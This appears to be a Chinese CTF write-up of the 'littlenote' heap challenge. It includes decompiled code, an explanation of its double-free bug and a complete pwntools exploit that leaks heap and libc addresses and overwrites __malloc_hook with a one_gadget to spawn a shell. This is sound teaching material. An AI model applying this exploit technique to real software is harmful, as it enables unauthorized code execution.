---
layout:     post
title:      "铁三2018全国总决赛之littlenote"
subtitle:   "double free +堆块伪造 "
date:       2018-12-10 12:00:00
author:     "Chris"
catalog: true
tags:
    - Pwn
 
---

铁三这次全国总决赛给了三道Pwn题，littlenote 算得上里面相对简单的一道

下面看程序ida代码

## 程序功能

```python
1. add a note
2. show a note
3. delete a note
4. exit
```

## add 函数 

只能添加 fastbin 大小的 chunk

```c
unsigned __int64 addnote()
{
  __int64 v0; // rbx
  __int64 v1; // rbx
  char buf; // [rsp+0h] [rbp-20h]
  unsigned __int64 v4; // [rsp+8h] [rbp-18h]

  v4 = __readfsqword(0x28u);
  if ( (unsigned __int64)notenum > 0xF )
    puts("FULL");
  v0 = notenum;
  note[v0] = malloc(0x60uLL);
  puts("Enter your note");
  read(0, note[notenum], 0x60uLL);
  puts("Want to keep your note?");
  read(0, &buf, 7uLL);
  if ( buf == 78 )
  {
    puts("OK,I will leave a backup note for you");
    free(note[notenum]);
    v1 = notenum;
    note[v1] = malloc(0x20uLL);
  }
  ++notenum;
  puts("Done");
  return __readfsqword(0x28u) ^ v4;
}
```

## show 函数



```c
unsigned __int64 shownote()
{
  unsigned int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Which note do you want to show?");
  _isoc99_scanf("%u", &v1);
  if ( v1 < (unsigned __int64)notenum )
  {
    if ( note[v1] )
      puts((const char *)note[v1]);
    puts("Done");
  }
  else
  {
    puts("Out of bound!");
  }
  return __readfsqword(0x28u) ^ v2;
}
```
## free 函数

释放后未将指针至零，存在 Double free ， UAF 漏洞

```c
unsigned __int64 freenote()
{
  unsigned int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Which note do you want to delete?");
  _isoc99_scanf("%u", &v1);
  if ( v1 < (unsigned __int64)notenum )
  {
    if ( note[v1] )
      free(note[v1]);
    puts("Done");
  }
  else
  {
    puts("Out of bound!");
  }
  return __readfsqword(0x28u) ^ v2;
}
```

## 漏洞利用

程序没有edit函数，只能通过double free对已释放的堆块进行编辑.

可利用fastbin 链泄露堆地址，然后在申请的堆内存中伪造一个堆块，用于后面泄露libc地址.

通过double free申请到这个伪造的堆块，并编辑伪造堆块内容覆盖到下一个堆块的size头，改成非fastbin size.

![pic1]

释放掉这个非fastbin chunk，泄露libc等一系列地址.

再次使用double free 控制malloc_hook上方内容，并将malloc_hook改成one_gadget.

get shell 

## EXP

```python
#!usr/bin/python
# -*- coding: utf-8 -*-
from pwn import *

#context(os='linux', arch='amd64', log_level='debug')
p = process("./littlenote")
libc = ELF("./libc.so.6")

def add(data):
    p.recvuntil("choice:")
    p.sendline(str(1))
    p.recvuntil("your note")
    p.send(data)
    p.recvuntil("keep your note?")
    p.send("Y\x00")

def show(idx):
    p.recvuntil("choice:")
    p.sendline(str(2))
    p.recvuntil("show?")
    p.sendline(str(idx))

def dele(idx):
    p.recvuntil("choice:")
    p.sendline(str(3))
    p.recvuntil("delete?")
    p.sendline(str(idx))

## chunk0里面伪造一个0x70大小的chunk，用于覆盖chunk1
    
fake_chunk=p64(0)+p64(0x71)

add(fake_chunk)
add("1")
add("2")
add("other")

# 泄露堆地址，并同时double free，分配到伪造的chunk
# 覆盖chunk1的头字段，将chunk1的size填成(0xe1)非fastbin chunk

dele(2)
dele(1)
show(1)
p.recvline()
heap_base = u64(p.recvuntil('\n',drop=True).ljust(0x8,"\x00"))-0xe0
print "heap_base : " +hex(heap_base)
dele(2)

add(p64(heap_base+0x10))
add("f")
add("g")
add("h"*0x50+p64(0)+p64(0xe1))

## 释放chunk1 进入Unsorted Bin，泄露libc

dele(1)
show(1)
p.recvline()
libc_base= u64(p.recvuntil('\n',drop=True).ljust(0x8,"\x00"))-0x58-0x3c2760
print "libc_base : " +hex(libc_base)

malloc_hook=libc_base+0x3C2740
one_gadget=libc_base+0xe9415
print "malloc_hook : " +hex(malloc_hook)
print "one_gadget : " +hex(one_gadget)

## 再次使用double free ，控制malloc_hook地址并覆盖成one_gadget

add("1")
add("2")
dele(2)
dele(1)
dele(2)

add(p64(malloc_hook-0x23))
add("f")
add("g")
add('\x00'*0x13+p64(one_gadget))

###  get shell

p.recvuntil("choice:")
p.sendline(str(1))

p.interactive()
```

>[程序与脚本链接](https://github.com/yxshyj/project/tree/master/pwn/littlenote)


[pic1]:data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAo0AAAIKCAYAAABGGHUtAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAAEnQAABJ0Ad5mH3gAADo+SURBVHhe7d29biNn+q19HYujCSYaOBLgfMKJOjA6tTLDZzAYw7EBpRsTTNKR4w3lE3gfwT9TsqP3PQzuKlZRovjcRT78kHqR/bswF6ZbJItF3i2vhaeqyLtVJ//zP/8z/wmJmE825gOcjt+fbMwnm0vOR2m8EcwnG/MBTsfvTzbmk80l56M03gjmk435AKfj9ycb88nmkvNRGm8E88nGfIDT8fuTjflkc8n5KI03gvlkYz7A6fj9ycZ8srnkfJTGG8F8sjEf4HT8/mRjPtlccj5K441gPtmYD3A6fn+yMZ9sLjmfu3FjJN/X//N//zfJM6x+r0h+rFYabwTzyaYKQZL9Ihf5k80l56M03gjmk00VgiT7RS7yJxulEQ3mk00VgiT7RS7yJxulEQ3mk00VgiT7RS7yJxulEQ3mk00VgiT7RS7yJxulEQ3mk00VgiT7RS7yJxulEQ3mk00VgiT7RS7yJxulEQ0Xmc/z4+r+7m718DT/PYl32bfn1dPjw3q794/P88/ehyoEeaX+5++ru+HfzD/+U9z20f73X6tffvzL6q/D/oz7NPrXv/199ft/i/teuchFP8hGaUSD0ngkz0+rh/vXoFUa2W1MafzX6h/jv9+hJP7yn3+v/vjv6FQi7+7+svrlxoojctEPslEa0aA09vM8ry7e3T+sHp8eVw/Dn5VGXpu//zgWxp9Wfxx527WKXPSDbJRGNCiNvTyvHh/GsrgpiU9KI6/P//60PiS9uNp56PYrFLnoB9kojWhQGk9FaeT1+cc/x0PQf1/9Xtw2+e/VL3+7W939+K/itusUuegH2SiNaDg0n+fxMOzWOXx3d/er+4fH1ZuqtF3Mhj8/3N+/uf9DVawOlbmnh/Vj3zx0/Zj5Z+vnebtfRz/P8BzjbfcnNUql8Tin8+jWK1jFRRib8+uax22vfA2P+8dYaNb3f3sI9Y///DTcNhaizTaH7Q/F55zDrH/88+87+/iXYT/e7uP6cO72fXbd3s895zS+x/5X9hx+vrVD1MhFP8hGaUTDvvk8P07lbyyJT8/Pq+fRoUSORevufqs4borZw1jCxvL2NN138Olh3sZuuTq5NE7PM5XEM55nUxhPLn1K43FOpfGvP05F7K8//rT6fX0BxvZFGMPP/7lTHF9K47gCNpW26TGv95tWz3a2OZSwdeE7sfxM2xye759DcZu3+fv8PG9L3+v+vHUogePzb6/YLZTGY/f/YFHd9s2KYd8q4uHVyOsSuegH2SiNaFiez55StFvE5r83JW/m6WG87WHY4hZnlMazn+fswjiiNB7nfMXuYFMMZ6cytHv17lw214Vx++ezc6kst7nvtr1O5ap6XN8q3FzOdu9XlcaT9n+7nB5w53FKI5LQD7JRGtGwNJ9plbEuZw2bMrfUAPetGp5SGs95nvnv55c9pfE459K4r3CVJWn/4w4VnNMOtc5F9eiyOblZpWw+uqYoje+z/0sqjchCP8hGaUTD0nzWq3bbh6D3caiIrcvcTkE8ozSe/DwXK4wjSuNxzuVvb2GpSs2+xy2s6G15agHarHrunsN40H2fxdjc9n77X6s0Igv9IBulEQ31fJ5Xj+NFJkeWxsUCWN1+6DE9q4a77Huex+n/m1J5Mkrjcfat3rUra/seN5egea7LnvKB1cO25/Ms144X6oznN5b3nZ1XShdL2VJp3DzHopf7wO2elcvLrm5+fZGLfpCN0oiGb6U0juH78DReMDP+eee8x5NQGo/zHUvjUNLK8/m2bB/b6/D4//y0VSAXzq3c7Mu+srVUGo/e//o+pW8epzQiC/0gG6URDUvzOeXw9CVLY3lO5UWeZyp73a9tEaXxOPcdZt74WqJef7a/bH5swfn39HzFoduln7+xOHR9yv5Pz9Xpzvt9+NBzX7m/JpGLfpCN0oiGpfmcciHMeWXuLdOK4HuUxoH5Z4sX1HShNB7nXBr3FaQ9F8IslZgPP/9uvY87h4v3nce4bXG/r7P/e/b10O1XKHLRD7JRGtGwOJ+5WJWlaLeIVcVsm/L2ecWvetCm1L1XaRypLpo5CqXxOOfSOLh0cUm9Wndg5evAeYS/jx8iPh7+LW5b8o91uVs4j3D3trLoLliVy3fY/0Mur4p2HGK/QpGLfpCN0oiGffN5/XDv1w/R3vvh3seUuYHqw8OfHqfPUNx8gPe7lcaBcjVzDy/vwdpNadx6bwYvTRWC1+lc/qoP915/G8o4i+p8wQOlcXBarau2Of78lItI5oI7f0vN5vzA3zffEPNS8Db3G0rW5nkLX7a7sCJ5+f0/ZPX6hp/NM7j8831dkYt+kI3SiIZD83l+Gkpc8zWCQ1Gab19zYmkceZ5L4sv27x+mErd+zPuWxuHG6YKfngtj5u28vg+V/QW0lyoEr9Ot8rcuKFNR2vjXocD8XpaVrcc1t736WrI22xxX6MYSVt//oOVXHc7fEPNyn3mV8IAvJXGhNI5efP8POp6f+fb1ve/zfT2Ri36QjdKIBvPJpgrB67Sv/JGXFrnIn2yURjSYTzZVCF6nSiO/jshF/mSjNKLBfLKpQvA6/cqlcT40fNjbO6fvWxe5yJ9slEY0mE82VQhep1Ya+XVELvInG6URDeaTTRWC16nSyK8jcpE/2Vy0NI4bI/m+ViFIst/q94rkx2ql8UYwn2yqECTZL3KRP9lccj5K441gPtlUIUiyX+Qif7JRGtFgPtlUIUiyX+Qif7JRGtFgPtlUIUiyX+Qif7JRGtFgPtlUIUiyX+Qif7JRGtFgPtlUIUiyX+Qif7JRGtFgPtlUIUiyX+Qif7JRGtFgPtlUIfhNOX/93z/+U9yW7H//tfrlx7+s/vry9YR3q7/+7e+r38/6isJ/r3752/ZXHu7xx38Vj5+28fs//77er2/lg9aRi/zJRmlEg/lkU4XgN+VVlsbp22/uhpL4y3/+vfrjv6NTiTz7u63X29rnT8vfvDPswz+2SqfSiK+N/MlGaUSD+WRThSCz/f3HsTD+tPrjyNsu4Xr7d39f/b7z8z/m1cWpyO4pljcocpE/2SiNaDCfbKoQZLD//WldzhZXRg/dfo6L2/736pcfp1XP6e/f1veAIxf5k43SiAbzyaYKQeb6xz/HQ9DtSt+r83mJi+ccnuq83a5VTKURGcifbJRGNJhPNlUI3oovh0w3/u0vq3+8rIbNFuc0Todg91gUpz/GQ7LD9l/v95fVX4fidunDxD2Hn9/cZ+85m0cUwfV2es+XVBqRgfzJRmlEg/lkU4XgLTityA0l8Z9DcZsv4vh9/bOdAlWWqt2LPzZO5+rtruJNzzWUpB9/Wv2+ue9QIqdz/NpCdrCUbvvmufpWEXdXI5dWJzfv0eEieMwq46jSiAzkTzZKIxrMJ5sqBK/fqeRUpaVZqeu+enqhOM3n+ZUFafG27SJ6wJ3HnVIay8ft2+9dF89lXFJpRAbyJxulEQ3mk00VgtfvEaWlszQurcotreJt7Dmc3O+ppXHwTfFbKMALHv8alEZkIH+yURrRYD7ZVCF4C06HgItzGHftKY2L9zlcvg6VyuM8ozRu/fyXo/bplAKoNCID+ZON0ogG88mmCsHbcChY6w+7HsvjWOzGslRcmHKoNM4rdHVRm0vc5jkWPfMDt7fsWfVbvs/r/h5aWX1x/f4cu/9KIzKQP9kojWgwn2yqELwt/72+KOW1QI6rj1u37y2Nh1YSX1f+yvMRt9x9XHWf0jePO7c0TmVu/T4cWK3c2PN8rUojMpA/2SiNaDCfbKoQvF3/PZWg7UOze0pjc9/CU0rVtN1Od8rd4cPdy4XtZV8Pra6+eGr5UxqRgfzJRmlEg/lkU4XgTbs+3Lx1uHWpQHUWq8ues9jhoSuZl25fv57X191TiA8+16JKIzKQP9kojWgwn2yqELx2p5W0hfPwdm+ryuFclrpKz3zfpcO9v/94+Q/5Xi58C4fTy9czFbu9h6n3vY97VRqRgfzJRmlEg/lkU4Xg9TsXovHil/+8nh/4++YbYraLUlMaN48ditf2uYU7vj7XZrVxKEk7H+49fUPMKaXrkNXrG362vshl9/n2nJd5YCVxel19+7/93qz3ZXw/tj5YfbR63C2IXORPNkojGswnmyoEb8KhuIwXv6xL4sbxawR3r6DeLY2blcMD7hat+msExxL59n6Xczw/8+3rq57vUPHbd3v3ofeu9+w9ynOGyEX+ZKM0osF8sqlCkGS/yEX+ZKM0osF8sqlCkGS/yEX+ZKM0osF8sqlCkGS/yEX+ZKM0osF8sqlCkGS/yEX+ZKM0osF8sqlCkGS/yEX+ZHPR0jhujOT7Wl/pSrLX6veK5MdqpRH4CP6//0XyHBGLfpDNJeejNAIfQRWCJPtFLPpBNkojcG1UIUiyX8SiH2SjNALXRhWCJPtFLPpBNkojcG1UIUiyX8SiH2SjNALXRhWCJPtFLPpBNkojcG1UIUiyX8SiH2SjNJ7L8+Pq4X7z+V/3q8fn+efHMGzjfnj8w9P893SS9/fa3stTqEKQ1+mXH9b/7Xj4Utz20f758+rx83fr35/N5xnef//D6unP4r7XLmJRGrNRGs/iafUw/sf1/mH19Py8Gv53Gkrj5VAaeU3GlMafp/+WDSXx8ctvq+c/R6cSeXf33erx1oojYlEas1Eaz+HpYfoP/rkFRWm8HEojebRPn8fC+Gn1fORtVytiURqzURrPYV0aTzwkvY3SeDmURvI4//w0/c4srXYeuv0aRSxKYzZK4zkojXkojeRRPv86HoL+YfVU3Db52+rx+7vV3eefi9uuVMSiNGajNJ7A8+P9+rB045um8jx0yvt1gXm5/f5+9VA1zH1FZyim4233Ozc+P40X4Gzvx/Bcw33O7q/r7W7t83q7j2+3u72/w5939+Po1zhSFfD1Y+afrZ/n7X5d6r28OqoQvEqn8+jWK1jFRRib8+uax22vfA2PexgLzfr+bw+hPn/5NNw2FqLNNoftD8XnnMOsz7/+sLOP3w378XYf14dzt++z6/Z+7jmn8T32v7Ln8PPNHaJGLEpjNkrjSYwXvQxuis7T/Pf51vH2x3XB2bptcCyR43/873fLzlLR2ZScnftvSutY5qYLcAaHsrcOs/udgncE3dvd7O/DuH9jeRvK6nz/o1/jhsXSOD3PVBLPeJ6F9/IqqULwKp1K4/3nqYjdf/60elpfgLF9Ecbw8193iuNLaRxXwKbSNj3m9X7T6tnONocSNj7u1PIzbXN4vl+H4jZv82l+nrel73V/3jqUwPH5t1fsFkrjsft/sKhu+2bFsG8V8fBq5JWJWJTGbJTGc6iKzsi6uAwlpyhITw/jf7gfVm9uqorOUsmZ71uWn323HWS6Enzfdl/2b/57+doHul/jNntK49nPc0uFcaQKwat0vmJ3nM1uMZydytDu1btz2VwXxu2fz86lstzmvtv2OpWr6nF9q3BzOdu9X1UaT9r/7XJ6wJ3HKY1IQmnMRmk8h6XSuI895Wi3lFUlZ1oN3ClKW6yL1AmrjdN2O1/LpswtNcCe17jLvtJ4zvPseS+vlioEr9K5NO4rXGVJ2v+4QwXntEOtc1E9umxOblYpm4+uKUrj++z/kkojslAas1Eaz+E9SuPekjMf9t5TCg+VyiWOKpuHitj6Ne4UxN0yt8ue9+Xk5zn0+GulCsGrdC5/ewtLVWr2PW5hRW/LUwvQZtVz9xzGg+77LMbmtvfb/1qlEVkojdkojeewtzQ+r54eH1b3by4S2bhQGh+n/1+HSFmuNudKHvLIIttRRt9wqABWtx96zKEyXbHveQ6+l1dMFYJXad/qXbuytu9xcwmaZ7/sKR9YPWx7Ps9y7Xihznh+Y3nf2XmldLGULZXGzXMserkP3O5Zubzs6maAiEVpzEZpPIel0jgXl/G2sbw8Pb1ewPFy8UxRjsYweHgaL/IY/1ytFs7lbmhBL9tb8DhurzQefi+vmCoEr9J3LI1DSSvP59uyfWyvw+O/fNoqkAvnVm72ZV/ZWiqNR+9/fZ/SN49TGpGF0piN0ngOC6Vxb1HpKkebrydsS9yp5ywe4pTD06eUuaXHlOdUXuR5lt/Lq6UKwat032Hmja8l6vVn+8vmxxac36bnKw7dLv38jcWh61P2f3quTnfe78OHnvvK/VWJWJTGbJTGcyhL41xSFppOdzmaf7a7nVPPWTzEKRfCLLzEva9n6TFT0X6P0jgw/2zxgpprowrBq3QujfsK0p4LYZZKzIeff7fex53DxfvOY9y2uN/X2f89+3ro9msUsSiN2SiN51CWxtdDyC1zoewtR+vt7/z8QAFaf6D4cFtP93vDvN3yopHd/Vva3w3l7XvK9OY1vVdpHKney2ulCsGrdC6N41wWLi6pV+sOrHwdOI/wafwQ8fHwb3Hbks/rcrdwHuHubWXRXbAql++w/4dcXhXtOMR+jSIWpTEbpfEcytI49pbp4pd1educZzjcd7woZvNB1b3lqFqBe93+2w/hnr6Zpd2fXur9ngvd9uHdU8rcQLXf64uFxvse+b6sqW4/8r28SqoQvErn8ld9uPf621DGeVXnCx4ojYPTal21zfHnp1xEMhfc+VtqNucHPm2+Ieal4G3uN5SszfMWvmx3YUXy8vt/yOr1DT+bZ3D55/vKIhalMRul8RwWSuPIVBLH/+DO3j9M91uXmmPK0eaK6beHpF9L4uY5pq/7ezqzEDX7vd7uzsrlKWVu5nkuiS/bP/l9Gahu3/uY+r28OqoQvEq3yt+6oExFaeP9UGCeyrKy9bjmtldfS9Zmm+MK3VjC6vsftPyqw/kbYl7uM68SHvClJC6UxtGL7/9Bx/Mz376+932+ryhiURqzURqBa6MKwau0r/yRFxex6AfZKI3AtVGF4FWqNPIriVj0g2yUxltlfej89TDTsjdwjt+3RhWCV+lXLo3zoeHD3uA5fd+6iEU/yEZpBK6NKgSvUiuN/EoiFv0gG6URuDaqELxKlUZ+JRGLfpDNRUvjuDGS72sZgiS7rX6vSH6sVhpvBPMJpwhBkkeIWORPNpecj9J4I5hPOFUIkuwXscifbJRGNJhPOFUIkuwXscifbJRGNJhPOFUIkuwXscifbJRGNJhPOFUIkuwXscifbJRGNJhPOFUIkuwXscifbJRGNJhPOFUIkuwXscifbJRGNJhPOFUIfkvOX//38KW4Ldk/f149fv5udf/y9YR3q/vvf1g9nfUVhb+tHr/f/srDPX7+uXj8tI2nX39Y79c380HriEX+ZKM0osF8wqlC8FvyKkvj9O03d0NJfPzy2+r5z9GpRJ793dbrbe3z0/I37wz78LBVOpVGfG3kTzZKIxrMJ5wqBBnt0+exMH5aPR952yVcb//uh9XTzs+f59XFqcjuKZa3KGKRP9kojWgwn3CqEGSuf35al7PFldFDt5/j4rZ/Wz1+nlY9p79/Y98DjljkTzZKIxrMJ5wqBBnr86/jIeh2pe/V+bzExXMOT3XebtcqptKIDORPNkojGswnnCoEb8SXQ6Ybv/9u9fCyGjZbnNM4HYLdY1GcnsdDssP2X+/33ep+KG6XPkzcc/j5zX32nrN5RBFcb6f3fEmlERnIn2yURjSYTzhVCN6A04rcUBJ/HYrbfBHH0/pnOwWqLFW7F39snM7V213Fm55rKEmfP62eNvcdSuR0jl9byA6W0m3fPFffKuLuauTS6uTmPTpcBI9ZZRxVGpGB/MlGaUSD+YRTheDVO5WcqrQ0K3XdV08vFKf5PL+yIC3etl1ED7jzuFNKY/m4ffu96+K5jEsqjchA/mSjNKLBfMKpQvDqPaK0dJbGpVW5pVW8jT2Hk/s9tTQOvil+CwV4weNfg9KIDORPNkojGswnnCoEb8DpEHBxDuOuPaVx8T6Hy9ehUnmcZ5TGrZ8/HrVPpxRApREZyJ9slEY0mE84VQjehEPBWn/Y9Vgex2I3lqXiwpRDpXFeoauL2lziNs+x6JkfuL1lz6rf8n1e9/fQyuqL6/fn2P1XGpGB/MlGaUSD+YRTheBN+dv6opTXAjmuPm7dvrc0HlpJfF35K89H3HL3cdV9St887tzSOJW59ftwYLVyY8/ztSqNyED+ZKM0osF8wqlC8Gb9bSpB24dm95TG5r6Fp5Sqabud7pS7w4e7lwvby74eWl198dTypzQiA/mTjdKIBvMJpwrBW3Z9uHnrcOtSgeosVpc9Z7HDQ1cyL92+fj2vr7unEB98rkWVRmQgf7JRGtFgPuFUIXjlTitpC+fh7d5WlcO5LHWVnvm+S4d7nz5f/kO+lwvfwuH08vVMxW7vYep97+NelUZkIH+yURrRYD7hVCF49c6FaLz45cvr+YFPm2+I2S5KTWncPHYoXtvnFu74+lyb1cahJO18uPf0DTGnlK5DVq9v+Nn6Ipfd59tzXuaBlcTpdfXt//Z7s96X8f3Y+mD10epxNyFikT/ZKI1oMJ9wqhC8BYfiMl78si6JG8evEdy9gnq3NG5WDg+4W7TqrxEcS+Tb+13O8fzMt6+ver5DxW/f7d2H3rves/cozyEiFvmTjdKIBvMJpwpBkv0iFvmTjdKIBvMJpwpBkv0iFvmTjdKIBvMJpwpBkv0iFvmTjdKIBvMJpwpBkv0iFvmTjdKIBvMJpwpBkv0iFvmTzUVL47gxku9rGYIku61+r0h+rFYabwTzCacIQZJHiFjkTzaXnI/SeCOYTzhVCJLsF7HIn2yURjSYTzhVCJLsF7HIn2yURjSYTzhVCJLsF7HIn2yURjSYTzhVCJLsF7HIn2yURjSYTzhVCJLsF7HIn2yURjSYTzhVCJLsF7HIn2yURjSYTzhVCJLsF7HIn2yURjSYTzhVCJLsF7HIn2yURjSYTzhVCJLsF7HIn2yURjSYTzhVCJLsF7HIn2yURjSYTzhVCJLsF7HIn2yURjSYTzhVCJLsF7HIn2yURjSYTzhVCJLsF7HIn2yURjSYTzhVCJLsF7HIn2yURjSYTzhVCJLsF7HIn2yURjSYTzhVCJLsF7HIn2yURjSYTzhVCJLsF7HIn2yURjSYTzhVCJLsF7HIn2yURjSYTzhVCJLsF7HIn2yURjSYTzhVCJLsF7HIn2yURjSYTzhVCJLsF7HIn2yURjSYTzhVCJLsF7HIn2yURjSYTzhVCJLsF7HIn2yURjSYTzhVCJLsF7HIn2yURjSYTzhVCJLsF7HIn2yURjSYTzhVCJLsF7HIn2yURjSYTzhVCJLsF7HIn2yURjSYTzhVCJLsF7HIn2wuWhrHjZF8X8sQJNlt9XtF8mO10ngjmE84RQiSPELEIn+yueR8lMYbwXzCqUKQZL+IRf5kozSiwXzCqUKQZL+IRf5kozSiwXzCqUKQZL+IRf5kozSiwXzCqUKQZL+IRf5kozSiwXzCqUKQZL+IRf5kozSiwXzCqUKQZL+IRf5kozSiwXzCqUKQZL+IRf5kozSiwXzCqUKQZL+IRf5kozSiwXzCqUKQZL+IRf5kozSiwXzCqUKQZL+IRf5kozSiwXzCqUKQZL+IRf5kozSiwXzCqUKQZL+IRf5kozSiwXzCqUKQZL+IRf5kozSiwXzCqUKQZL+IRf5kozSiwXzCqUKQZL+IRf5kozSiwXzCqUKQZL+IRf5kozSiwXzCqUKQZL+IRf5kozSiwXzCqUKQZL+IRf5kozSiwXzCqUKQZL+IRf5kozSiwXzCqUKQZL+IRf5kozSiwXzCqUKQZL+IRf5kozSiwXzCqUKQZL+IRf5kozSiwXzCqUKQZL+IRf5kozSiwXzCqUKQZL+IRf5kozSiwXzCqUKQZL+IRf5kozSiwXzCqUKQZL+IRf5kozSiwXzCqUKQZL+IRf5kozSiwXzCqUKQZL+IRf5kc9HSOG6M5PtahiDJbqvfK5Ifq5XGG8F8wilCkOQRIhb5k80l56M03gjmE04VgiT7RSzyJxulEQ3mE04VgiT7RSzyJxulEQ3mE04VgiT7RSzyJxulEQ3mE04VgiT7RSzyJxulEQ3mE04VgiT7RSzyJxulEQ3mE04VgiT7RSzyJxulEQ3mE04VgiT7RSzyJxulEQ3mE04VgiT7RSzyJxulEQ3mE04VgiT7RSzyJxulEQ3mE04VgiT7RSzyJxulEQ3mE04VgiT7RSzyJxulEQ3mE04VgiT7RSzyJxulEQ3mE04VgiT7RSzyJxulEQ3mE04VgiT7RSzyJxulEQ3mE04VgiT7RSzyJxulEQ3mE04VgiT7RSzyJxulEQ3mE04VgiT7RSzyJxulEQ3mE04VgiT7RSzyJxulEQ3mE04VgiT7RSzyJxulEQ3mE04VgiT7RSzyJxulEQ3mE04VgiT7RSzyJxulEQ3mE04VgiT7RSzyJxulEQ3mE04VgiT7RSzyJxulEQ3mE04VgiT7RSzyJxulEQ3mE04VgiT7RSzyJxulEQ3mE04VgiT7RSzyJxulEQ3mE04VgiT7RSzyJxulEQ3mE04VgiT7RSzyJ5uLlsZxYyTf1zIESXZb/V6R/FitNN4I5hNOEYIkjxCxyJ9sLjkfpfFGMJ9wqhAk2S9ikT/ZKI1oMJ9wqhAk2S9ikT/ZKI1oMJ9wqhAk2S9ikT/ZKI1oMJ9wqhAk2S9ikT/ZKI1oMJ9wqhAk2S9ikT/ZKI1oMJ9wqhAk2S9ikT/ZKI1oMJ9wqhAk2S9ikT/ZKI1oMJ9wqhAk2S9ikT/ZKI1oMJ9wqhAk2S9ikT/ZKI1oMJ9wqhAk2S9ikT/ZKI1oMJ9wqhAk2S9ikT/ZKI1oMJ9wqhAk2S9ikT/ZKI1oMJ9wqhAk2S9ikT/ZKI1oMJ9wqhAk2S9ikT/ZKI1oMJ9wqhAk2S9ikT/ZKI1oMJ9wqhAk2S9ikT/ZKI1oMJ9wqhAk2S9ikT/ZKI1oMJ9wqhAk2S9ikT/ZKI1oMJ9wqhAk2S9ikT/ZKI1oMJ9wqhAk2S9ikT/ZKI1oMJ9wqhAk2S9ikT/ZKI1oMJ9wqhAk2S9ikT/ZKI1oMJ9wqhAk2S9ikT/ZKI1oMJ9wqhAk2S9ikT/ZKI1oMJ9wqhAk2S9ikT/ZKI1oMJ9wqhAk2S9ikT/ZKI1oMJ9wqhAk2S9ikT/ZKI1oMJ9wqhAk2S9ikT/ZXLQ0jhsj+b7e3d2RPMPq94rkx2ql8UYwn3CqlROS/SIW+ZPNJeejNN4I5hNOFYIk+0Us8icbpREN5hNOFYIk+0Us8icbpREN5hNOFYIk+0Us8icbpREN5hNOFYIk+0Us8icbpREN5hNOFYIk+0Us8icbpREN5hNOFYIk+0Us8icbpRENF5nP8+Pq/u5u9fA0/z2JU/bt+Wn1cH//5rPe7u8fVk/P8+0fSRWCvE6//LD+t/Twpbjto/3z59Xj5+/Wvxsv/8a//2H19Gdx32sXsegH2SiNaFAad3h62CqJz6vntU+rx4epRH74a6xCkNdpTGn8efUw7MfdUBIfv/y2ev5zdCqRd3ffrR5vrTgiFv0gG6URDUrjNk9TmC7c+elhXJEZyuT89w+hCkHyDJ8+j4Xx0+r5yNuuVsSiH2SjNKJBadxivcp4v3pcOgz9NV5nFYLkqf75afo3vLTaeej2axSx6AfZKI1oUBqPQGnklfv863gI+ofVU3Hb5G+rx+/vVneffy5uu1IRi36QjdKIhkPzeX56XD3cj4dlN96v7h8eV28W47bL1PDntxeR3K8eqqW7QwWsWvVbP2b+2fp53u7X0c8zPMd4231vC5zPd1QaT3E6j269glVchLE5v6553PbK1/C4h7HQrO//9hDq85dPw21jIdpsc9j+UHzOOcz6/OsPO/v43bAfb/dxfTh3+z67bu/nnnMa32P/K3sOP9/cIWrEoh9kozSiYd98nh+n8jeWxJeLQoYSuQ7S+63iuClmD2MJG8vb03wByfPQs+Zt7Ba6k0vj9DxTSTzjeTaFsSqaCzin8Ryn0nj/eSpi958/rZ7WF2BsX4Qx/PzXneL4UhrHFbCptE2Peb3ftHq2s82hhI2PO7X8TNscnu/XobjN23yan+dt6Xvdn7cOJXB8/u0Vu4XSeOz+Hyyq275ZMexbRTy8GnllIhb9IBulEQ3L85kuCilL1W4Rm//elLyZsmydURrPfp4TCuO0P0c+5hJUIXiVzlfsju/hbjGcncrQ7tW7c9lcF8btn8/OpbLc5r7b9jqVq+pxfatwcznbvV9VGk/a/+1yesCdxymNSEI/yEZpRMPSfKZVxrqcNWzK3FID3LdqeEppPOd55r8fVf4OPe97UoXgVTqXxn2FqyxJ+x93qOCcdqh1LqpHl83JzSpl89E1RWl8n/1fUmlEFvpBNkojGpbms1612z4EvY9DRWxepXvTuXbL3C57CuDJz3Po8RXDNsfHdL8Xl6YKwat0Ln97C0tVavY9bmFFb8tTC9Bm1XP3HMaD7vssxua299v/WqURWegH2SiNaKjn87x6HC8yObI0LhbA6vZDj+lZNdxl3/M8Tv/flMo9bM7pHFcYv0phHKlC8CrtW71rV9b2PW4uQfNclz3lA6uHbc/nWa4dL9QZz28s7zs7r5QulrKl0rh5jkUv94HbPSuXl13dDBCx6AfZKI1o+FZK4xi+D0/jBTPjnw9fzPJ6EdChe74zVQhepe9YGoeSVp7Pt2X72F6Hx3/5tFUgF86t3OzLvrK1VBqP3v/6PqVvHqc0Igv9IBulEQ1L8znl8PQpZW7pMeU5lRd5nvlbX/a8tpfCeMxh7PeiCsGrdN9h5o2vJer1Z/vL5scWnN+m5ysO3S79/I3FoetT9n96rk533u/Dh577yv1ViVj0g2yURjQszeeUC2HOK3NvmVYE36M0Dsw/Ky9smc+L/CoXvVRUIXiVzqVxX0HacyHMUon58PPv1vu4c7h433mM2xb3+zr7v2dfD91+jSIW/SAbpRENi/OZi1W52rZbxKpitk15+57ved6UuvcqjSPVRTMdq5AfThWCV+lcGsf3fOHiknq17sDK14HzCJ/GDxEfD/8Wty35vC53C+cR7t5WFt0Fq3L5Dvt/yOVV0Y5D7NcoYtEPslEa0bBvPtvn9W0+RHvvh3sfU+YGXrf/+uHhT4/T1cqbD/B+t9I4sLuaudmf8dzHl9dbOd39Y6hC8Cqdy1/14d7rb0MZZ1GdL3igNA5Oq3XVNsefn3IRyVxw52+p2Zwf+LT5hpiXgre531CyNs9b+LLdhRXJy+//IavXN/xsnsHln+8ri1j0g2yURjQcms/z+JEzzdcI7lxNfGJpHHmeS+LL9u8fphK3fsz7lsbhxumCn/nCmKlEdri4A+9AFYJX6Vb5WxeUqShtvB8KzFNZVrYe19z26mvJ2mxzXKEbS1h9/4OWX3U4f0PMy33mVcIDvpTEhdI4evH9P+h4fubb1/e+z/cVRSz6QTZKIxrMJ5wqBK/SvvJHXlzEIn+y